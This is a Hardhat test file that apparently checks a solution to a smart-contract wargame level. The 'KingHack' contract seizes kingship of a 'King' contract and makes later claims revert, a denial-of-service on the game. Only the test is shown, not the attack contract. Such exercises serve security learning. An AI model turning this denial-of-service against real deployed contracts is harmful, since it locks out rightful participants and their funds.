const { expect } = require("chai");
const { assert } = require("console");
const { ethers, deployments } = require("hardhat");

describe("KingHack", async () => {
  let deployer, deployer2;
  beforeEach(async function () {
    [deployer, deployer2] = await ethers.getSigners();
    await deployments.fixture(["King", "KingHack"]);
    kingHack = await ethers.getContract("KingHack");
    king = await ethers.getContract("King");
  });

  it("Should become the king and not let any one to claim kingship", async () => {
    console.log("deployer", deployer.address);
    console.log("deployer2", deployer2.address);
    var prize = await king.prize();
    const oldKing = await king._king();
    await kingHack
      .connect(deployer)
      .becomeKing(king.address, { value: prize.toNumber() + 1 });
    const newKing = await king._king();
    expect(newKing).not.equal(oldKing);
    prize = await king.prize();

    await expect(
      deployer2.sendTransaction({
        from: deployer2.address,
        to: king.address,
        value: prize.toNumber() + 1,
        gasLimit: 100000,
      })
    ).revertedWith("I'm the king!");
  });
});
